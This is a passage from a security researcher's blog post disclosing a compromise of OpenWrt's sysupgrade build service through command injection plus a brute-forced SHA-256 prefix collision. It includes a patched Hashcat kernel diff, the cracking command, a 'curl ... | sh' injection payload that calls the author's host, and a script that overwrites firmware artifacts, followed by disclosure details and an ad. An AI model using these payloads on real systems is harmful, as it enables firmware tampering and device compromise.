</span></span></span><span><span><span></span>   SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev);
</span></span><span><span>   SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev);
</span></span><span><span>   SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev);
</span></span><span><span><span>-
</span></span></span><span><span><span></span><span>+*/
</span></span></span><span><span><span></span>   /**
</span></span><span><span>    * loop
</span></span><span><span>    */
</span></span><span><span><span>@@ -279,7 +279,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>     w7_t = SHA256_EXPAND (w5_t, w0_t, w8_t, w7_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, b, c, d, e, f, g, h, a, w7_t, SHA256C37);
</span></span><span><span>     w8_t = SHA256_EXPAND (w6_t, w1_t, w9_t, w8_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, a, b, c, d, e, f, g, h, w8_t, SHA256C38);
</span></span><span><span> 
</span></span><span><span><span>-    if (MATCHES_NONE_VS (h, d_rev)) continue;
</span></span></span><span><span><span></span><span>+    //if (MATCHES_NONE_VS (h, d_rev)) continue;
</span></span></span><span><span><span></span> 
</span></span><span><span>     w9_t = SHA256_EXPAND (w7_t, w2_t, wa_t, w9_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, h, a, b, c, d, e, f, g, w9_t, SHA256C39);
</span></span><span><span>     wa_t = SHA256_EXPAND (w8_t, w3_t, wb_t, wa_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, g, h, a, b, c, d, e, f, wa_t, SHA256C3a);
</span></span><span><span><span>@@ -289,7 +289,8 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>     we_t = SHA256_EXPAND (wc_t, w7_t, wf_t, we_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, c, d, e, f, g, h, a, b, we_t, SHA256C3e);
</span></span><span><span>     wf_t = SHA256_EXPAND (wd_t, w8_t, w0_t, wf_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, b, c, d, e, f, g, h, a, wf_t, SHA256C3f);
</span></span><span><span> 
</span></span><span><span><span>-    COMPARE_S_SIMD (d, h, c, g);
</span></span></span><span><span><span></span><span>+    //COMPARE_S_SIMD (d, h, c, g);
</span></span></span><span><span><span>+    COMPARE_S_SIMD (a, a, a, a);
</span></span></span><span><span><span></span>   }
</span></span><span><span> }
</span></span><span><span> 
</span></span><span><span><span>diff --git a/src/modules/module_01400.c b/src/modules/module_01400.c
</span></span></span><span><span><span>index ab002efbe..03549d7f5 100644
</span></span></span><span><span><span></span><span>--- a/src/modules/module_01400.c
</span></span></span><span><span><span></span><span>+++ b/src/modules/module_01400.c
</span></span></span><span><span><span></span><span>@@ -11,10 +11,10 @@
</span></span></span><span><span><span></span> #include "shared.h"
</span></span><span><span> 
</span></span><span><span> static const u32   ATTACK_EXEC    = ATTACK_EXEC_INSIDE_KERNEL;
</span></span><span><span><span>-static const u32   DGST_POS0      = 3;
</span></span></span><span><span><span>-static const u32   DGST_POS1      = 7;
</span></span></span><span><span><span>-static const u32   DGST_POS2      = 2;
</span></span></span><span><span><span>-static const u32   DGST_POS3      = 6;
</span></span></span><span><span><span></span><span>+static const u32   DGST_POS0      = 0;
</span></span></span><span><span><span>+static const u32   DGST_POS1      = 0;
</span></span></span><span><span><span>+static const u32   DGST_POS2      = 0;
</span></span></span><span><span><span>+static const u32   DGST_POS3      = 0;
</span></span></span><span><span><span></span> static const u32   DGST_SIZE      = DGST_SIZE_4_8;
</span></span><span><span> static const u32   HASH_CATEGORY  = HASH_CATEGORY_RAW_HASH;
</span></span><span><span> static const char *HASH_NAME      = "SHA2-256";
</span></span></code></pre></div><p>Then, I wrapped it with a small script to check if the output from Hashcat contains the 12-character collision.</p>
<h2 id="combining-both-attacks">Combining both attacks</h2>
<p>To combine both attacks, we need to find a payload that has the 12-character hash collision against the legitimate package list.</p>
<p>I’ve gathered the package list from the <code>firmware-selector.openwrt.org</code>, which is a frontend of the <code>sysupgrade.openwrt.org</code>, and calculated the legitimate hash:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ <span>printf</span> <span>'base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd'</span> | sha256sum
</span></span><span><span>8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb  -
</span></span></code></pre></div><p>The first 12 characters of this hash are <code>8f7018b33d94</code>, so we need to find a command injection payload that has the same prefix for the hash.</p>
<p>To find such a payload, I executed the modified version of the Hashcat on RTX 4090 with the following command:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ ./hashcat -m <span>1400</span> 8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb -O -a <span>3</span> -w <span>3</span> <span>'`curl -L tmp.ryotak.net/?l?l?l?l?l?l?l?l?l?l|sh`'</span> --self-test-disable --potfile-disable --keep-guessing
</span></span></code></pre></div><p>After executing the command, Hashcat started to calculate hashes at the speed of around 500 million hashes per second, so I left it running.</p>
<p>When I checked the output after a while, the Hashcat calculated all possible patterns, but it didn’t find 12-character collisions. This was because I calculated the space of <code>?l?l?l?l?l?l?l?l?l?l</code> wrongly.</p>
<p><code>?l</code> is a mask pattern that generates <code>a-z</code>, so the space of <code>?l?l?l?l?l?l?l?l?l?l</code> (10 characters) is <code>26^10 = 141,167,095,653,376</code>, which is about half of <code>2^48 = 281,474,976,710,656</code>.<br>
But, while calculating the space, I incorrectly calculated it as <code>26^11 = 3,670,344,486,987,776</code>, and thought that it should be enough to find the collision.</p>
<p>So, I fixed the mask pattern to <code>?l?l?l?l?l?l?l?l?l?l?l</code> (11 characters) and left it running again. After executing the command, I wondered if I could make the brute-forcing faster, so I started to poke the Hashcat.</p>
<p>Soon, I noticed that the performance drastically increased when I moved the mask pattern to the start of the command like <code>`?l?l?l?l?l?l?l?l?l?l?l `curl -L tmp.ryotak.net/|sh`</code><br>
With a bit of testing, I confirmed that I can increase the speed about 36 times by simply changing the pattern to the following:</p>
<pre tabindex="0"><code>`?l?l?l?l?l?l?l?l?l?l?l||curl -L tmp.ryotak.net/8f7018b33d94|sh`
</code></pre><p>By using this pattern, the Hashcat was able to calculate the hashes at the speed of 18 billion hashes per second. Within an hour, the Hashcat found the 12 characters collision:</p>
<pre tabindex="0"><code>$ printf '`slosuocutre||curl -L tmp.ryotak.net/8f7018b33d94|sh`' | sha256sum
8f7018b33d9464976ab199f100812d2d24d5e84a76555c659e88e0b6989a4bd8 &nbsp;-
</code></pre><p>Sending this payload as the <code>packages</code> parameter, the command injection is triggered and the script from <code>tmp.ryotak.net</code> is executed.<br>
I placed the following script in <code>tmp.ryotak.net/8f7018b33d94</code>, which overwrites the artifact produced by the imagebuilder.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>cat &gt;&gt; /builder/scripts/json_overview_image_info.py <span>&lt;&lt;PY
</span></span></span><span><span><span>import os
</span></span></span><span><span><span>files = os.listdir(os.environ["BIN_DIR"])
</span></span></span><span><span><span>for filename in files:
</span></span></span><span><span><span>    if filename.endswith(".bin"):
</span></span></span><span><span><span>        filepath = os.path.join(os.environ["BIN_DIR"], filename)
</span></span></span><span><span><span>        with open(filepath, "w") as f:
</span></span></span><span><span><span>            f.write("test")
</span></span></span><span><span><span>PY</span>
</span></span></code></pre></div><p>Then, as the hash collision occurred, the server returns the overwritten build artifact to the legitimate request that requests the following packages:</p>
<pre tabindex="0"><code>base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd
</code></pre><p>By abusing this, an attacker could force the user to upgrade to the malicious firmware, which could lead to the compromise of the device.</p>
<h2 id="reporting-the-issue">Reporting the issue</h2>
<p>After confirming the attack, I reported the issue to the OpenWrt team via <a href="https://github.com/openwrt/asu/security/advisories/new" target="_blank" rel="noopener">the private vulnerability reporting on GitHub</a>
.</p>
<p>Soon after acknowledging the issue, they stopped the <code>sysupgrade.openwrt.org</code> service temporarily and investigated the issue. Within 3 hours, they released the fixed version and restarted the service.</p>
<p>While both issues are fixed by the OpenWrt team, it was unknown if this attack was exploited by someone else because this vulnerability existed for a while.<br>
So, they decided to release <a href="http://lists.openwrt.org/pipermail/openwrt-announce/2024-December/000061.html" target="_blank" rel="noopener">an announcement</a>
 to notify the users to ensure no devices are compromised and detect if it was compromised.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this article, I explained how I could compromise the <code>sysupgrade.openwrt.org</code> service by exploiting the command injection and the SHA-256 collision.<br>
As I never found the hash collision attack in a real-world application, I was surprised that I could successfully exploit it by brute-forcing hashes.</p>
<p>I appreciate the effort of the OpenWrt team to fix the issues in an incredibly short time and notify the users promptly.</p>
<h2 id="shameless-plug">Shameless plug</h2>
<p>At Flatt Security, we specialize in providing top-notch security assessment and penetration testing services. To celebrate the update of our brand new English web pages, you can currently receive a month-long investigation by our elite engineers for just $40,000!</p>
<p>We also offer a powerful security assessment tool called Shisho Cloud, which combines Cloud Security Posture Management (CSPM) and Cloud Infrastructure Entitlement Management (CIEM) capabilities with Dynamic Application Security Testing (DAST) for web applications.</p>
<p>If you’re interested in learning more, feel free to reach out to us at <a href="https://flatt.tech/en" target="_blank" rel="noopener">https://flatt.tech/en</a>
.</p>


  </article></div>]]></description>
        </item>
    </channel>
</rss>